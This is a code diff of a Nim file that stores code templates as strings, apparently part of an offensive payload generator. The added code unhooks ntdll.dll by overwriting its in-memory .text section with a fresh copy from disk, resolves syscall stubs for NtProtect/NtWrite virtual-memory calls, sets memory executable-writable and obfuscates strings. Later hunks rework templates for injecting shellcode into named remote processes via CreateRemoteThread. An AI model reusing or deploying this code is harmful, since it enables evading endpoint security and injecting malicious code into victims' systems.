@@ -1,6 +1,5 @@
 import strformat
 import strutils
-from GlobalVars import remoteprocesses
 
 let GetSyscallStub * = """
 type
@@ -73,6 +72,156 @@ proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
             copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
             stubFound = 1
     return stubFound
+
+"""
+
+
+# Todo - use theese functions for all modules
+
+let NtProtectVirtualMemoryDelegate * = """
+# Unmanaged NTDLL Declaration
+type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+"""
+
+
+let NtWriteVirtualMemoryDelegate * = """
+# Unmanaged NTDLL Declaration
+type myNtWriteVirtM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+
+var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+
+"""
+
+
+let NtCloseDelegate * = """
+# Unmanaged NTDLL Declaration
+type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+
+"""
+
+let NtAllocateVirtualMemoryDelegate * = """
+# Unmanaged NTDLL Declaration
+type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+"""
+
+
+let NtProtectSyscallStart * = """
+var hProcess: HANDLE
+hProcess = GetCurrentProcess()
+    
+let tProcess2 = GetCurrentProcessId()
+var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+var syscallStub_NtProtect: LPVOID
+syscallStub_NtProtect = VirtualAllocEx(
+    pHandle2,
+    NULL,
+    cast[SIZE_T](SYSCALL_STUB_SIZE),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+)
+
+"""
+let UnhookSyscalls * = """
+
+
+proc GetUnhookStubs(): void =
+
+ 
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    
+    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    
+    var oldProtection: DWORD = 0
+    
+    # Define NtProtectVirtualMemory
+    NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    
+    # define NtWriteVirtualMemory
+    NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    
+    # define NtClose
+    NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
+    VirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    
+    
+    success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
+    success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
+    success = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
+
+"""
+
+let UnhookStub * = """
+
+from winim import MODULEINFO, GetModuleInformation
+
+proc ntdllunhook(): bool =
+  let low: uint16 = 0
+  var 
+      processH = GetCurrentProcess()
+      mi : MODULEINFO
+      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
+      ntdllBase : LPVOID
+      ntdllFile : FileHandle
+      ntdllMapping : HANDLE
+      ntdllMappingAddress : LPVOID
+      hookedDosHeader : PIMAGE_DOS_HEADER
+      hookedNtHeader : PIMAGE_NT_HEADERS
+      hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  ntdllBase = mi.lpBaseOfDll
+  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
+  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  if ntdllMapping == 0:
+    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
+    return false
+  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  if ntdllMappingAddress.isNil:
+    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
+    return false
+  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+  var status = 0
+  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+      if ".text" in toString(hookedSectionHeader.Name):
+          var oldProtection: DWORD = 0
+          var oldProtection2: DWORD = 0
+          var bytesWritten: SIZE_T
+          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
+          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
+          if status != 0:
+            echo obf"[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
+            return false
+          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+          if status != 0:
+            echo obf"[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
+            return false
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
+          if status != 0:
+            echo obf"[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
+            return false  
+  status = NtClose(processH)
+  status = NtClose(ntdllFile)
+  status = NtClose(ntdllMapping)
+  FreeLibrary(ntdllModule)
+  return true
+
+
+when isMainModule:
+  GetUnhookStubs()
+  var result = ntdllunhook()
+  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
 
 """
 
@@ -283,7 +432,7 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
 """
 
-let ShellcoderemoteinjectStub_customproc * = fmt"""
+let ShellcoderemoteinjectStub_customprocfirst * = fmt"""
 
 from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA
 
@@ -307,7 +456,9 @@ proc FindPidByName * (processName : string):DWORD =
 proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
     var processID: DWORD
-    var remoteprocesses: seq[string] = {remoteprocesses}
+"""
+
+let ShellcoderemoteinjectStub_customprocthird * = fmt"""
     var found: bool = false
     for m in remoteprocesses:
         if found == true: continue
